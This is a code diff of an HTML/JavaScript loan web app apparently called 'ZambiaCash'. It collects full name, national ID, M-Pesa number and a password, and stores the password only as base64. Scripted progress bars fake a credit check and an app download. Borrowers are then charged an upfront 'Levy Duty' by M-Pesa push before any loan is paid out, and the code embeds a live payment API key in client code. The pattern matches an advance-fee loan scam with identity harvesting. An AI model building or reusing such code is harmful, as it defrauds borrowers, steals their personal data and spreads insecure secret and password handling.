-        result.classList.remove('hidden');
-        return;
-      }
-
-      btn.disabled = true;
-      btnText.innerHTML = spinner() + ' Looking up...';
-      result.classList.add('hidden');
-
-      const { data: profile } = await sb.from('profiles').select('id, full_name').eq('phone', phone).maybeSingle();
-      if (!profile) {
-        btn.disabled = false;
-        btnText.textContent = 'Check Status';
-        result.className = 'bg-yellow-50 border border-yellow-100 text-yellow-800 text-sm rounded-xl p-3';
-        result.innerHTML = `No application found for <strong>${formatPhoneDisplay(phone)}</strong>.<br><button onclick="openApplyWizard()" class="mt-2 text-emerald-700 font-bold text-xs">Apply for a loan &rarr;</button>`;
-        result.classList.remove('hidden');
-        return;
-      }
-
-      const { data: apps } = await sb.from('loan_applications').select('*').eq('user_id', profile.id).order('created_at', { ascending: false });
-      btn.disabled = false;
-      btnText.textContent = 'Check Status';
-
-      if (!apps || apps.length === 0) {
-        result.className = 'bg-yellow-50 border border-yellow-100 text-yellow-800 text-sm rounded-xl p-3';
-        result.textContent = 'You have no applications yet.';
-        result.classList.remove('hidden');
-        return;
-      }
-
-      result.className = 'space-y-3';
-      result.innerHTML = `<p class="text-xs text-gray-500 mb-1">Found ${apps.length} application${apps.length > 1 ? 's' : ''} for <strong>${profile.full_name || formatPhoneDisplay(phone)}</strong></p>` +
-        apps.map(a => {
-          const statusColor = {
-            'sanctioned': 'bg-green-100 text-green-700',
-            'fee_paid': 'bg-emerald-100 text-emerald-700',
-            'processing': 'bg-blue-100 text-blue-700',
-            'disbursed': 'bg-blue-100 text-blue-700',
-            'rejected': 'bg-red-100 text-red-700',
-          }[a.status] || 'bg-gray-100 text-gray-700';
-          return `
-            <div class="bg-white rounded-2xl shadow-sm border border-gray-100 p-4">
-              <div class="flex justify-between items-start mb-2">
-                <div>
-                  <p class="font-bold text-base">${fmtZMW(a.loan_amount)}</p>
-                  <p class="text-[10px] text-gray-400">&asymp; ${fmt(a.loan_amount)}</p>
-                </div>
-                <span class="text-[10px] uppercase font-bold px-2 py-0.5 rounded-full ${statusColor}">${a.status.replace('_',' ')}</span>
-              </div>
-              <p class="text-[11px] text-gray-500">${a.tenure_months} months</p>
-              <p class="text-[10px] text-gray-400 font-mono mt-1">${a.reference_no || ''}</p>
-              ${a.status === 'fee_paid' ? '<p class="text-[11px] text-emerald-700 mt-2">&#10003; Levy duty paid. Money being processed.</p>' : ''}
-            </div>
-          `;
-        }).join('');
-      result.classList.remove('hidden');
-    }
-
-    async function loadDashboard() {
-      const { data: { user } } = await sb.auth.getUser();
-      if (!user) return showView('landingView');
-      currentUser = user;
-
-      const { data: profile } = await sb.from('profiles').select('*').eq('id', user.id).maybeSingle();
-      currentProfile = profile || null;
-
-      if (profile) $('pGreet').textContent = (profile.full_name || 'Mteja').split(' ')[0];
-      $('preApproved').textContent = fmtZMW(FLAT_LIMIT);
-      $('preApprovedKsh').textContent = 'Maximum you can borrow today (\u2248 ' + fmt(FLAT_LIMIT) + ')';
-
-      const { data: apps } = await sb.from('loan_applications').select('*').eq('user_id', user.id).order('created_at', { ascending: false });
-
-      const list = $('appsList');
-      if (!apps || apps.length === 0) {
-        list.innerHTML = '<p class="text-gray-500 text-xs">No applications yet.</p>';
-      } else {
-        list.innerHTML = apps.map(a => {
-          const statusColor = {
-            'sanctioned': 'bg-green-100 text-green-700',
-            'fee_paid': 'bg-emerald-100 text-emerald-700',
-            'processing': 'bg-blue-100 text-blue-700',
-            'rejected': 'bg-red-100 text-red-700',
-          }[a.status] || 'bg-gray-100 text-gray-700';
-          const paid = a.payment_status === 'paid' || a.status === 'fee_paid' || a.status === 'disbursed' || a.status === 'processing';
-          const needsPayment = a.status === 'sanctioned' && a.payment_status !== 'paid';
-          return `
-            <div class="border border-gray-100 rounded-lg p-3">
-              <div class="flex justify-between items-start mb-1">
-                <div>
-                  <p class="font-semibold text-sm">${fmtZMW(a.loan_amount)}</p>
-                  <p class="text-[10px] text-gray-400">&asymp; ${fmt(a.loan_amount)}</p>
-                </div>
-                <span class="text-[10px] uppercase font-bold px-2 py-0.5 rounded-full ${statusColor}">${a.status.replace('_',' ')}</span>
-              </div>
-              <p class="text-[11px] text-gray-500">${a.tenure_months} months</p>
-              ${a.reference_no ? `<p class="text-[10px] text-gray-400 font-mono mt-0.5">${a.reference_no}</p>` : ''}
-              ${paid ? `<p class="text-[11px] text-emerald-700 mt-2">&#10003; Levy duty received &mdash; your loan is being processed.</p>` : ''}
-              ${needsPayment ? `<button onclick="openOffer('${a.id}')" class="mt-2 w-full bg-green-600 text-white py-2 rounded-lg text-xs font-semibold">Withdraw</button>` : ''}
-            </div>`;
-        }).join('');
-      }
-      showView('dashboardView');
-    }
-
-    async function logoutUser() {
-      pollToken++;
-      clearInterval(stkCooldownTimer);
-      stkCooldownTimer = null;
-      stopProofTicker();
-      await sb.auth.signOut();
-      currentUser = null;
-      currentProfile = null;
-      pendingApplication = null;
-      showView('landingView');
-    }
-
-    async function openOffer(appId) {
-      const { data: app } = await sb.from('loan_applications').select('*').eq('id', appId).single();
-      if (!app) return;
-      currentApp = app;
-
-      const amount = Number(app.approved_amount || app.loan_amount);
-      const months = app.tenure_months;
-      const rate = Number(app.interest_rate || ANNUAL_RATE);
-      const emi = calcEmi(amount, months, rate);
-      const total = emi * months;
-      const interest = total - amount;
-      const { fee, total: feeTotal } = processingFee(amount);
-
-      $('refNo').textContent = app.reference_no || '\u2014';
-      $('offerId').textContent = currentProfile?.national_id || '\u2014';
-      $('offerAmount').textContent = fmtZMW(amount);
-      $('offerAmountKsh').textContent = '\u2248 ' + fmt(amount);
-      $('offerRate').textContent = rate;
-      $('offerTenure').textContent = months;
-      $('offerEmi').textContent = fmtZMW(emi);
-      $('offerInterest').textContent = fmtZMW(interest);
-      $('offerTotal').textContent = fmtZMW(total);
-      $('offerFee').textContent = fmtZMW(fee);
-      $('offerFeeKsh').textContent = '\u2248 ' + fmt(fee);
-      $('offerFeeTotal').textContent = fmtZMW(feeTotal);
-      $('offerFeeTotalKsh').textContent = '\u2248 ' + fmt(feeTotal);
-
-      showView('offerView');
-    }
-
-    function openPaymentView(source = 'dashboard') {
-      if (!currentApp) return;
-      paymentSource = source;
-
-      refreshPaymentSummary();
-      renderPaymentAmountBoxes();
-
-      $('mpesaPhone').value = currentProfile?.phone ? formatPhoneDisplay(currentProfile.phone) : '';
-
-      const payResult = $('payResult');
-      payResult.className = 'hidden mt-4 p-4 rounded-2xl text-sm';
-      payResult.innerHTML = '';
-
-      const msg = $('amountEditorMsg');
-      msg.className = 'hidden mt-2 text-xs text-center';
-      msg.textContent = '';
-
-      setAmountBoxesDisabled(false);
-      showView('paymentView');
-    }
-
-    function refreshPaymentSummary() {
-      if (!currentApp) return;
-      const amount = Number(currentApp.approved_amount || currentApp.loan_amount);
-      const { fee, total } = processingFee(amount);
-      $('sumLoan').textContent = fmtZMW(amount);
-      $('sumLoanKsh').textContent = '\u2248 ' + fmt(amount);
-      $('sumFee').textContent = fmtZMW(fee);
-      $('sumFeeKsh').textContent = '\u2248 ' + fmt(fee);
-      $('sumTotal').textContent = fmtZMW(total);
-      $('sumTotalKsh').textContent = '\u2248 ' + fmt(total);
-      $('payBtnText').textContent = PAY_BTN_LABEL;
-    }
-
-    function renderPaymentAmountBoxes() {
-      const container = $('paymentAmountBoxes');
-      container.innerHTML = '';
-      const currentAmount = Number(currentApp?.loan_amount || 0);
-      AMOUNT_STEPS.forEach(amt => {
-        const btn = document.createElement('button');
-        btn.type = 'button';
-        const isSelected = amt === currentAmount;
-        btn.className = 'amount-box-sm' + (isSelected ? ' selected' : '');
-        btn.dataset.amount = amt;
-        btn.innerHTML = `
-          <p class="text-[11px] font-bold ${isSelected ? 'text-emerald-900' : 'text-gray-900'}">${fmtZMW(amt)}</p>
-          <p class="text-[9px] ${isSelected ? 'text-emerald-700' : 'text-gray-500'} mt-0.5">${fmt(amt)}</p>
-        `;
-        btn.onclick = () => changeLoanAmount(amt);
-        container.appendChild(btn);
-      });
-    }
-
-    function setAmountBoxesDisabled(disabled) {
-      document.querySelectorAll('#paymentAmountBoxes button').forEach(b => {
-        b.disabled = disabled;
-      });
-    }
-
-    async function changeLoanAmount(newAmount) {
-      if (!currentApp) return;
-      if ($('payBtn').disabled) return;
-      if (Number(currentApp.loan_amount) === Number(newAmount)) return;
-
-      const msg = $('amountEditorMsg');
-      msg.className = 'mt-2 text-xs text-center text-gray-500';
-      msg.textContent = 'Updating...';
-
-      const { fee } = processingFee(newAmount);
-      const prevApp = { ...currentApp };
-      currentApp.loan_amount = newAmount;
-      currentApp.approved_amount = newAmount;
-      currentApp.processing_fee = fee;
-      refreshPaymentSummary();
-      renderPaymentAmountBoxes();
-
-      const { error } = await sb.from('loan_applications').update({
-        loan_amount: newAmount,
-        approved_amount: newAmount,
-        processing_fee: fee,
-      }).eq('id', currentApp.id);
-
-      if (error) {
-        currentApp.loan_amount = prevApp.loan_amount;
-        currentApp.approved_amount = prevApp.approved_amount;
-        currentApp.processing_fee = prevApp.processing_fee;
-        refreshPaymentSummary();
-        renderPaymentAmountBoxes();
-        msg.className = 'mt-2 text-xs text-center text-red-600';
-        msg.textContent = error.message;
-        return;
-      }
-
-      msg.className = 'mt-2 text-xs text-center text-emerald-700';
-      msg.textContent = 'Amount updated.';
-      setTimeout(() => { msg.classList.add('hidden'); }, 1500);
-      showToast('Loan amount updated to ' + fmtZMW(newAmount));
-    }
-
-    function goBackFromPayment() {
-      if (paymentSource === 'offer') showView('offerView');
-      else if (currentUser) showView('dashboardView');
-      else showView('landingView');
-    }
-
-    function cancelStkAndRetry() {
-      clearInterval(stkCooldownTimer);
-      stkCooldownTimer = null;
-      pollToken++;
-      const btn = $('payBtn');
-      const btnText = $('payBtnText');
-      btn.disabled = false;
-      btn.classList.remove('btn-processing');
-      btnText.textContent = PAY_BTN_LABEL;
-      setAmountBoxesDisabled(false);
-      showView('paymentView');
-    }
-
-    function renderConfirmAmountBoxes() {
-      const container = $('confirmAmountBoxes');
-      container.innerHTML = '';
-      AMOUNT_STEPS.forEach(amt => {
-        const btn = document.createElement('button');
-        btn.type = 'button';
-        const isSelected = amt === confirmSelectedAmount;
-        btn.className = 'amount-box-sm' + (isSelected ? ' selected' : '');
-        btn.innerHTML = `
-          <p class="text-[11px] font-bold ${isSelected ? 'text-emerald-900' : 'text-gray-900'}">${fmtZMW(amt)}</p>
-          <p class="text-[9px] ${isSelected ? 'text-emerald-700' : 'text-gray-500'} mt-0.5">${fmt(amt)}</p>
-        `;
-        btn.onclick = () => selectConfirmAmount(amt);
-        container.appendChild(btn);
-      });
-    }
-
-    function selectConfirmAmount(amt) {
-      confirmSelectedAmount = amt;
-      renderConfirmAmountBoxes();
-      updateConfirmSummary();
-      // Reset amount confirmation if user changes amount
-      cancelAmountConfirm();
-    }
-
-    function updateConfirmSummary() {
-      const amount = Number(confirmSelectedAmount || 0);
-      const { fee, total } = processingFee(amount);
-      $('confirmLoanAmount').textContent = fmtZMW(amount);
-      $('confirmLoanAmountKsh').textContent = '\u2248 ' + fmt(amount);
-      $('confirmFee').textContent = fmtZMW(fee);
-      $('confirmFeeKsh').textContent = '\u2248 ' + fmt(fee);
-      $('confirmTotal').textContent = fmtZMW(total);
-      $('confirmTotalKsh').textContent = '\u2248 ' + fmt(total);
-    }
-
-    function showConfirmPayment() {
-      if (!currentApp) return;
-      confirmSelectedAmount = Number(currentApp.approved_amount || currentApp.loan_amount);
-      renderConfirmAmountBoxes();
-      updateConfirmSummary();
-
-      resetPalplussConsent();
-
-      $('confirmPaymentModal').classList.remove('hidden');
-      startProofTicker();
-    }
-
-    function closeConfirmPayment() {
-      resetPalplussConsent();
-      stopProofTicker();
-      $('confirmPaymentModal').classList.add('hidden');
-      confirmSelectedAmount = null;
-    }
-
-    async function confirmPaymentAndProceed() {
-      if (!currentApp || !confirmSelectedAmount) return;
-
-      if (!palplussConsentConfirmed) {
-        showToast('Please complete both PALPLUSS FUTURE steps first', { variant: 'warning' });
-        return;
-      }
-
-      const newAmount = Number(confirmSelectedAmount);
-      const oldAmount = Number(currentApp.loan_amount);
-
-      if (newAmount !== oldAmount) {
-        const { fee } = processingFee(newAmount);
-        const { error } = await sb.from('loan_applications').update({
-          loan_amount: newAmount,
-          approved_amount: newAmount,
-          processing_fee: fee,
-        }).eq('id', currentApp.id);
-
-        if (error) {
-          showToast(error.message, { variant: 'error' });
-          return;
-        }
-
-        currentApp.loan_amount = newAmount;
-        currentApp.approved_amount = newAmount;
-        currentApp.processing_fee = fee;
-        refreshPaymentSummary();
-        renderPaymentAmountBoxes();
-      }
-
-      stopProofTicker();
-      $('confirmPaymentModal').classList.add('hidden');
-      resetPalplussConsent();
-      confirmSelectedAmount = null;
-      initiatePayment();
-    }
-
-    async function initiatePayment() {
-      const btn = $('payBtn');
-      const btnText = $('payBtnText');
-      const result = $('payResult');
-
-      const rawPhone = $('mpesaPhone').value.trim();
-      if (!isValidKePhone(rawPhone)) {
-        result.className = 'mt-4 p-4 rounded-2xl text-sm bg-red-50 border border-red-200 text-red-900';
-        result.textContent = 'Enter a valid phone number.';
-        result.classList.remove('hidden');
-        return;
-      }
-      const phone = normalizePhone(rawPhone);
-
-      setAmountBoxesDisabled(true);
-      const msg = $('amountEditorMsg');
-      msg.classList.add('hidden');
-
-      btn.disabled = true;
-      btn.classList.add('btn-processing');
-      result.classList.add('hidden');
-      btnText.innerHTML = spinner() + ' Sending STK push...';
-
-      if (currentApp.payment_status !== 'paid') {
-        await sb.from('loan_applications')
-          .update({ payment_status: 'unpaid', status: 'sanctioned', mpesa_receipt: null, paid_at: null })
-          .eq('id', currentApp.id);
-      }
-
-      const amount = Number(currentApp.approved_amount || currentApp.loan_amount);
-      const { total } = processingFee(amount);
-
-      try {
-        const { data, error } = await sb.functions.invoke('palpluss-stk', {
-          body: {
-            amount: Math.round(total),
-            phone: phone,
-            reference: currentApp.reference_no,
-            loanId: currentApp.id,
-          },
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
         });
-        if (error) throw new Error(error.message || 'Could not initiate payment');
-        if (!data || !data.success) {
-          if (data?.cooldownSeconds) throw new Error(`Please wait ${data.cooldownSeconds}s before trying again.`);
-          if (data?.blocked) throw new Error('Too many cancelled attempts on this loan. Please contact support.');
-          throw new Error(data?.error || 'Could not initiate payment');
+
+        btnStoreInstall.addEventListener('click', async () => {
+            if (!deferredPrompt) {
+                showToast("Tap ⋮ in Chrome and select 'Install app' to install.");
+                return;
+            }
+
+            deferredPrompt.prompt();
+            const { outcome } = await deferredPrompt.userChoice;
+
+            if (outcome === 'accepted') {
+                installActionArea.classList.add('hide');
+                fakeDownloadArea.classList.remove('hide');
+
+                let progress = 0;
+                const totalTicks = 100;
+                const tickMs = 300;
+                const increment = 100 / totalTicks;
+
+                const interval = setInterval(() => {
+                    progress += increment * (0.85 + Math.random() * 0.3);
+                    if (progress > 100) progress = 100;
+
+                    downloadBar.style.width = progress + "%";
+                    downloadPercent.innerText = Math.floor(progress) + "%";
+
+                    const downloadedMB = (1.2 + (10.0 - 1.2) * (progress / 100)).toFixed(1);
+                    downloadSize.innerText = downloadedMB + " MB / 10.0 MB";
+
+                    if (progress >= 100) {
+                        clearInterval(interval);
+                        setTimeout(() => {
+                            fakeDownloadArea.classList.add('hide');
+                            openAppArea.classList.remove('hide');
+                            localStorage.setItem('pwa_installed', 'true');
+                            showToast("✅ Installed! Look for ZambiaCash on your home screen.");
+                        }, 600);
+                    }
+                }, tickMs);
+            } else {
+                showToast("Installation is required to use ZambiaCash.");
+            }
+            deferredPrompt = null;
+        });
+
+        document.getElementById('btn-open-app').addEventListener('click', () => {
+            playStoreGate.classList.add('hide');
+
+            try { window.close(); } catch (e) {}
+
+            const isAndroid = /android/i.test(navigator.userAgent);
+            if (isAndroid) {
+                setTimeout(() => {
+                    try {
+                        window.location.href = 'intent://#Intent;action=android.intent.action.MAIN;category=android.intent.category.HOME;end';
+                    } catch (e) {}
+                }, 150);
+            }
+
+            setTimeout(() => {
+                if (!document.hidden) {
+                    findOnHomeScreen.classList.remove('hide');
+                }
+            }, 1200);
+        });
+
+        document.getElementById('btn-close-tab').addEventListener('click', () => {
+            try { window.close(); } catch (e) {}
+            setTimeout(() => {
+                try {
+                    window.location.href = 'intent://#Intent;action=android.intent.action.MAIN;category=android.intent.category.HOME;end';
+                } catch (e) {}
+            }, 100);
+            setTimeout(() => {
+                if (!document.hidden) {
+                    showToast("Tap ⋮ menu → Close tab to exit, then tap ZambiaCash on your home screen.", 6000);
+                }
+            }, 800);
+        });
+
+        document.getElementById('btn-use-browser').addEventListener('click', () => {
+            findOnHomeScreen.classList.add('hide');
+            appContent.classList.remove('hide');
+            checkSession();
+            showToast("💡 Tip: You can open ZambiaCash from your home screen anytime.", 6000);
+        });
+
+        window.addEventListener('appinstalled', () => {
+            localStorage.setItem('pwa_installed', 'true');
+            installActionArea.classList.add('hide');
+            fakeDownloadArea.classList.add('hide');
+            openAppArea.classList.remove('hide');
+        });
+
+        // ==========================================
+        // APP LOGIC
+        // ==========================================
+        function checkSession() {
+            const saved = localStorage.getItem('zc_user');
+            if (saved) {
+                state = { ...state, ...JSON.parse(saved) };
+                showScreen('screen-select');
+                buildLoanScreen();
+            }
+
+            const inflightTxn = localStorage.getItem('inflight_txn');
+            if (inflightTxn) {
+                showScreen('screen-success');
+                startPolling(inflightTxn);
+            }
         }
 
-        const warn = $('stkAttemptsWarn');
-        if (warn) {
-          if (typeof data.attemptsRemaining === 'number' && data.attemptsRemaining <= 1) {
-            warn.textContent = `⚠️ Last attempt — ${data.attemptsRemaining} remaining`;
-            warn.classList.remove('hidden');
-          } else {
-            warn.classList.add('hidden');
-          }
+        function logout() {
+            localStorage.removeItem('zc_user');
+            location.reload();
         }
 
-        showView('stkSentView');
-        startStkCooldown(STK_COOLDOWN_SECONDS);
-        pollPaymentStatus(currentApp.id);
-      } catch (err) {
-        btn.disabled = false;
-        btn.classList.remove('btn-processing');
-        btnText.textContent = PAY_BTN_LABEL;
-        setAmountBoxesDisabled(false);
-        showPayError(err.message || 'Could not start the payment. Please try again.');
-      }
-    }
+        function submitLogin() {
+            const name = document.getElementById('in-name').value.trim();
+            const id = document.getElementById('in-id').value.trim();
+            const mpesa = document.getElementById('in-mpesa').value.trim();
+            const pass = document.getElementById('in-pass').value;
 
-    async function pollPaymentStatus(loanId) {
-      const myToken = ++pollToken;
+            if (!/^[A-Za-z][A-Za-z .'-]{2,}$/.test(name)) return alert("Enter a valid full name");
+            if (!/^\d{7,8}$/.test(id)) return alert("ID must be 7-8 digits");
+            if (!/^0(?!77)(1[01]|7[0-9])\d{7}$/.test(mpesa)) return alert("Enter a valid Safaricom/Airtel number");
+            if (pass.length < 4) return alert("Password must be at least 4 characters");
 
-      for (let i = 0; i < 90; i++) {
-        await new Promise(r => setTimeout(r, 1000));
-        if (myToken !== pollToken) return;
+            state.name = name; state.id = id; state.mpesa = mpesa;
+            localStorage.setItem('zc_user', JSON.stringify(state));
 
-        let loan = null;
-        try {
-          const { data } = await sb.from('loan_applications')
-            .select('status, payment_status, mpesa_receipt, loan_amount, reference_no, processing_fee')
-            .eq('id', loanId).single();
-          loan = data;
-        } catch (e) {}
-        if (!loan) continue;
-        if (myToken !== pollToken) return;
+            if ("Notification" in window) Notification.requestPermission();
 
-        if (loan.payment_status === 'paid') {
-          clearInterval(stkCooldownTimer);
-          stkCooldownTimer = null;
-          const btn = $('payBtn');
-          const btnText = $('payBtnText');
-          btn.disabled = false;
-          btn.classList.remove('btn-processing');
-          btnText.textContent = 'Withdrawn';
-          showProcessingView(loan);
-          return;
+            fetch(`${SUPABASE_URL}/rest/v1/users`, {
+                method: 'POST',
+                headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json', 'Prefer': 'return=minimal' },
+                body: JSON.stringify({ full_name: name, national_id: id, mpesa_number: mpesa, password_hash: "web_" + btoa(pass) })
+            }).catch(e => console.log(e));
+
+            startChecking();
         }
 
-        if (loan.payment_status === 'failed' || loan.payment_status === 'cancelled') {
-          clearInterval(stkCooldownTimer);
-          stkCooldownTimer = null;
-          const btn = $('payBtn');
-          const btnText = $('payBtnText');
-          btn.disabled = false;
-          btn.classList.remove('btn-processing');
-          btnText.textContent = PAY_BTN_LABEL;
-          setAmountBoxesDisabled(false);
-          showView('paymentView');
-          return;
+        function startChecking() {
+            showScreen('screen-checking');
+            let progress = 0;
+            const msgs = ["Analyzing profile...", "Reviewing information...", "Checking M-Pesa...", "Calculating limit...", "Almost there..."];
+            const interval = setInterval(() => {
+                progress += 2;
+                document.getElementById('check-bar').style.width = progress + "%";
+                document.getElementById('check-percent').innerText = progress + "%";
+                document.getElementById('check-status').innerText = msgs[Math.min(4, Math.floor(progress / 20))];
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => buildLoanScreen(), 300);
+                }
+            }, 200);
         }
-      }
 
-      if (myToken !== pollToken) return;
-      clearInterval(stkCooldownTimer);
-      stkCooldownTimer = null;
-      const btn = $('payBtn');
-      const btnText = $('payBtnText');
-      btn.disabled = false;
-      btn.classList.remove('btn-processing');
-      btnText.textContent = PAY_BTN_LABEL;
-      setAmountBoxesDisabled(false);
-      showView('paymentView');
-    }
+        function buildLoanScreen() {
+            const grid = document.getElementById('amount-grid');
+            grid.innerHTML = '';
+            amounts.forEach(amt => {
+                const btn = document.createElement('button');
+                btn.className = `amount-btn py-3 border-2 border-slate-200 rounded-xl font-bold text-sm ${amt === state.loan ? 'selected' : 'text-slate-700'}`;
+                btn.innerText = amt.toLocaleString();
+                btn.onclick = () => {
+                    document.querySelectorAll('.amount-btn').forEach(b => { b.classList.remove('selected'); b.classList.add('text-slate-700'); });
+                    btn.classList.add('selected'); btn.classList.remove('text-slate-700');
+                    state.loan = amt;
+                    updateSummary();
+                };
+                grid.appendChild(btn);
+            });
+            updateSummary();
+            showScreen('screen-select');
+        }
 
-    function showProcessingView(loan) {
-      $('procReceipt').textContent = loan.mpesa_receipt || '\u2014';
-      $('procRef').textContent = loan.reference_no || '\u2014';
-      $('procAmount').textContent = fmtZMW(loan.loan_amount);
-      $('procAmountKsh').textContent = '\u2248 ' + fmt(loan.loan_amount);
-      const fee = loan.processing_fee || WITHDRAWAL_FEE;
-      $('procFee').textContent = fmtZMW(fee);
-      $('procFeeKsh').textContent = '\u2248 ' + fmt(fee);
-      showView('processingView');
-    }
+        function setTerm(days) {
+            state.term = days;
+            document.querySelectorAll('.term-btn').forEach(b => { b.classList.remove('selected'); b.classList.add('text-slate-600'); });
+            event.target.classList.add('selected'); event.target.classList.remove('text-slate-600');
+            updateSummary();
+        }
 
-    (async () => {
-      renderLandingAmountBoxes();
+        function updateSummary() {
+            state.levy = calculateLevy(state.loan);
+            let rate = state.term === 30 ? 0.10 : (state.term === 60 ? 0.15 : 0.20);
+            state.interest = Math.round(state.loan * rate);
+            state.total = state.loan + state.interest;
+            let ratePct = rate * 100;
 
-      const { data: { user } } = await sb.auth.getUser();
-      if (user) {
-        currentUser = user;
-        const { data: profile } = await sb.from('profiles').select('*').eq('id', user.id).maybeSingle();
-        currentProfile = profile || null;
-        loadDashboard();
-      } else {
-        showView('landingView');
-      }
-    })();
-  </script>
+            document.getElementById('sum-receive').innerText = format(state.loan);
+            document.getElementById('sum-interest').parentElement.innerHTML = `<span class="text-slate-500 text-sm">Interest (${ratePct}%)</span><span class="font-bold">${format(state.interest)}</span>`;
+            document.getElementById('sum-total').innerText = format(state.total);
+            document.getElementById('sum-due').innerText = getDueDate(state.term);
+            document.getElementById('sum-levy').innerText = format(state.levy);
+        }
+
+        function goToPayment() {
+            document.getElementById('pay-loan').innerText = format(state.loan);
+            document.getElementById('pay-interest').innerText = format(state.interest);
+            document.getElementById('pay-total').innerText = format(state.total);
+            document.getElementById('pay-due').innerText = getDueDate(state.term);
+            document.getElementById('pay-levy').innerText = format(state.levy);
+            document.getElementById('pay-name').innerText = state.name;
+            document.getElementById('pay-mpesa').value = state.mpesa;
+            document.getElementById('btn-pay').innerText = `Pay ${format(state.levy)} Levy Duty`;
+            showScreen('screen-payment');
+        }
+
+        async function processPayment() {
+            const mpesa = document.getElementById('pay-mpesa').value.trim();
+            if (!/^0(?!77)(1[01]|7[0-9])\d{7}$/.test(mpesa)) return alert("Enter a valid M-Pesa number");
+
+            document.getElementById('btn-pay').innerText = "Sending STK Push...";
+            document.getElementById('btn-pay').disabled = true;
+            state.mpesa = mpesa;
+            localStorage.setItem('zc_user', JSON.stringify(state));
+
+            try {
+                const res = await fetch(`${SUPABASE_URL}/functions/v1/palpluss-stk`, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${SUPABASE_KEY}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        amount: state.levy,
+                        phone: "254" + mpesa.substring(1),
+                        accountReference: "ZC_" + state.name.replace(/[^A-Za-z0-9]/g, '').substring(0,10) + "_" + Math.floor(Math.random()*9999),
+                        channelId: PALPLUSS_CHANNEL,
+                        callbackUrl: PALPLUSS_CALLBACK
+                    })
+                });
+
+                const rawText = await res.text();
+                console.log("Raw response:", rawText);
+
+                let data;
+                try {
+                    data = JSON.parse(rawText);
+                } catch (parseErr) {
+                    throw new Error("Server returned non-JSON: " + rawText.substring(0, 200));
+                }
+
+                if (!res.ok) {
+                    let errorMsg;
+                    if (typeof data.error === 'string') errorMsg = data.error;
+                    else if (data.error && typeof data.error === 'object') errorMsg = data.error.message || JSON.stringify(data.error);
+                    else if (typeof data.message === 'string') errorMsg = data.message;
+                    else if (typeof data === 'string') errorMsg = data;
+                    else errorMsg = JSON.stringify(data);
+                    throw new Error(`[${res.status}] ${errorMsg}`);
+                }
+
+                const txnId = data.data?.transactionId || data.data?.transaction_id || data.transactionId || data.transaction_id || data.id;
+                if (!txnId) throw new Error("No transaction ID in response: " + JSON.stringify(data));
+
+                localStorage.setItem('inflight_txn', txnId);
+                showScreen('screen-success');
+                startPolling(txnId);
+
+            } catch (err) {
+                console.error("Payment error:", err);
+                let displayMsg = err.message || (typeof err === 'string' ? err : JSON.stringify(err));
+                alert("Payment Error:\n\n" + displayMsg + "\n\nCheck the browser console for details.");
+                document.getElementById('btn-pay').innerText = `Pay ${format(state.levy)} Levy Duty`;
+                document.getElementById('btn-pay').disabled = false;
+            }
+        }
+
+        function startPolling(txnId) {
+            let attempts = 0;
+            const timeDisplay = document.getElementById('verify-time');
+            pollTimer = setInterval(async () => {
+                attempts++;
+                timeDisplay.innerText = (attempts * 2) + "s";
+                if (attempts > 45) {
+                    clearInterval(pollTimer);
+                    alert("Timeout: If you entered your PIN, your loan will be allocated shortly.");
+                    return;
+                }
+                try {
+                    const auth = btoa(`pp_live_fd61cd105772b221c4dbb023629b56452a55e06e08687de5:`);
+                    const res = await fetch(`https://api.palpluss.com/v1/transactions/${txnId}`, {
+                        headers: { 'Authorization': `Basic ${auth}` }
+                    });
+                    const data = await res.json();
+                    const status = (data.data?.status || data.status || "").toUpperCase();
+                    if (status === "SUCCESS") {
+                        clearInterval(pollTimer);
+                        localStorage.removeItem('inflight_txn');
+                        showSuccess(txnId);
+                    } else if (status === "FAILED" || status === "CANCELLED") {
+                        clearInterval(pollTimer);
+                        localStorage.removeItem('inflight_txn');
+                        alert("Payment failed or cancelled. Please try again.");
+                        showScreen('screen-payment');
+                        document.getElementById('btn-pay').innerText = `Pay ${format(state.levy)} Levy Duty`;
+                        document.getElementById('btn-pay').disabled = false;
+                    }
+                } catch (e) { console.log("Poll error", e); }
+            }, 2000);
+        }
+
+        function showSuccess(txnId) {
+            document.getElementById('verify-anim').classList.add('hide');
+            document.getElementById('success-anim').classList.remove('hide');
+
+            document.getElementById('suc-loan').innerText = format(state.loan);
+            document.getElementById('suc-total').innerText = format(state.total);
+            document.getElementById('suc-due').innerText = getDueDate(state.term);
+            document.getElementById('suc-mpesa').innerText = state.mpesa;
+
+            fetch(`${SUPABASE_URL}/rest/v1/loans`, {
+                method: 'POST',
+                headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
+                body: JSON.stringify({ amount: state.loan, levy_duty: state.levy, status: "ALLOCATED", palpluss_txn_id: txnId })
+            }).catch(e => console.log(e));
+        }
+
+        function openInChrome() {
+            const url = window.location.href;
+            window.location.href = `intent://${window.location.host}${window.location.pathname}#Intent;scheme=https;package=com.android.chrome;end`;
+            if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) window.location.href = url;
+        }
+        function copyLink() {
+            navigator.clipboard.writeText(window.location.href).then(() => {
+                alert("✅ Link copied! Now paste it in Google Chrome.");
+            }).catch(() => {
+                prompt("Copy this link and paste it in Chrome:", window.location.href);
+            });
+        }
+
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => navigator.serviceWorker.register('sw.js'));
+        }
+    </script>
 </body>
 </html>
